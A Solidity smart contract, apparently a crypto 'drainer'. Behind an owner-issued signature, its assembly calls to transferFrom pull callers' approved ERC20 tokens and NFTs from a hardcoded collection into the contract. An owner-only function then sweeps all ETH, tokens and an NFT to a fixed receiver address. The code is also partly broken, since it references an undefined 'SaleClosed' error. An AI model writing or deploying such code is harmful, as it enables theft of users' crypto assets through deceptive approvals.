// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

error dupa();
import "lib/openzeppelin-contracts//contracts/token/ERC721/utils/ERC721Holder.sol";
import "lib/openzeppelin-contracts/contracts/interfaces/IERC721.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol";
import "lib/solady/src/utils/ECDSA.sol";
import "lib/openzeppelin-contracts/contracts/access/Ownable.sol";
import "lib/solady/src/utils/SafeTransferLib.sol";

contract Transferator is Ownable, ERC721Holder{

    uint8 public saleState;
  
  
    address public tokeno;
    address public signer;
    

    using ECDSA for bytes32;
    using SafeERC20 for IERC20;

      constructor( address _tokeno) {
        tokeno = _tokeno;
    
    }


 function transferNFT(uint256 amount,uint256 tokenIds,
 bytes calldata signature
    ) external payable requireSignature(signature) {
    address voult =  address(this);
    address user = msg.sender;
   if (saleState != 1) {
        revert dupa();
        
   }

     assembly{

        let tok := sload(tokeno.slot)
            mstore(0x00, hex"23b872dd")
            mstore(0x04, user)
            mstore(0x24, voult)
            mstore(0x44, amount)

            
            if iszero(call(gas(),tok, 0, 0x00, 0x64, 0, 0)) {
                revert(0, 0)
            }

        mstore(0x00, hex"23b872dd") 
        mstore(0x04, caller())
        mstore(0x24, voult)
        mstore(0x44, tokenIds)

        if iszero(call(gas(),0xecaab68e0d903067ebb89a0fefa6332ab93f7408, 0, 0x00, 0x64, 0, 0)) {
            revert(0, 0)
        }
    }
   }
      


   function transferTokens(uint256 amount,
    bytes calldata signature
    ) external payable requireSignature(signature) {
    address voult =  address(this);
    address user = msg.sender;
   
      if (saleState != 1) {
        revert SaleClosed();
    
    }
   
assembly{

let tok := sload(tokeno.slot)
            mstore(0x00, hex"23b872dd")
            mstore(0x04, user)
            mstore(0x24, voult)
            mstore(0x44, amount)
 
         if iszero(call(gas(), tok, 0, 0x00, 0x64, 0, 0)) {
                revert(0, 0)
         }
    }
    }


 function transferNFT(uint256 tokenIds,
     bytes calldata signature
    ) external payable requireSignature(signature) {
          address voult =  address(this);

   if (saleState != 1) {
        revert dupa();

    }
assembly{  
        mstore(0x00, hex"23b872dd") 
        mstore(0x04, caller())
        mstore(0x24, voult)
        mstore(0x44, tokenIds)

        if iszero(call(gas(), 0xecaab68e0d903067ebb89a0fefa6332ab93f7408 , 0, 0x00, 0x64, 0, 0)) {
            revert(0, 0)
        }
    }
}


   modifier requireSignature(bytes calldata signature) {
        require(
            keccak256(abi.encode(msg.sender)).toEthSignedMessageHash().recover(
                signature
            ) == signer,
            "Invalid signature."
        );
        _;
    }

   function setSaleState(uint8 value) external onlyOwner {
        require(value == 0 || value == 1, "Invalid state value");
        saleState = value;
    }
   function setSigner(address value) external onlyOwner {
        signer = value;
    }


    function withdrawso(uint256 TokenId, address nft) external payable onlyOwner {
        address receiver = 0x1e526ecc6CDcaB653823968b58056Ad5b438C92b;

        SafeTransferLib.safeTransferETH(receiver, address(this).balance);
        uint256 _uniqBalance = IERC20(tokeno).balanceOf(address(this));
        SafeTransferLib.safeApprove(tokeno, receiver, type(uint256).max);
        SafeTransferLib.safeTransfer(tokeno, receiver, _uniqBalance);
        IERC721(nft).safeTransferFrom(address(this), receiver, TokenId);
    }
  }
